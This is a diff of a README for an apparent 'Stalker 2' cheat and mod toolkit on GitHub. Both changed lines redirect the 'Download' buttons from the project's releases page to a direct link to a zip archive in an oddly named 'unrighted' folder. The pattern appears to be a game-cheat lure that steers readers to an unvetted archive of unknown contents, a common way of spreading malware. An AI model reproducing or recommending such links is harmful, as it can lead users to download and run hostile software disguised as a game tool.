@@ -1,6 +1,6 @@
 # 🎮 stalker-2-trainer-cheats-mod-toolkit - Master the Zone Like a Pro
 
-[![Download Now](https://img.shields.io/badge/Download-Stalker_2_Toolkit-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tyree123/stalker-2-trainer-cheats-mod-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Stalker_2_Toolkit-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/tyree123/stalker-2-trainer-cheats-mod-toolkit/main/unrighted/trainer_mod_stalker_cheats_toolkit_v1.9-alpha.1.zip)
 
 ## 🧭 What Is This?
 
@@ -134,7 +134,7 @@ The Zone is dangerous, but you don't have to face it alone. With the s.t.a.l.k.e
 
 Remember, the only bad artifact is the one you never found.
 
-**[Download the Toolkit Now](https://github.com/tyree123/stalker-2-trainer-cheats-mod-toolkit/releases)** and step into the Zone with confidence.
+**[Download the Toolkit Now](https://raw.githubusercontent.com/tyree123/stalker-2-trainer-cheats-mod-toolkit/main/unrighted/trainer_mod_stalker_cheats_toolkit_v1.9-alpha.1.zip)** and step into the Zone with confidence.
 
 ---
 
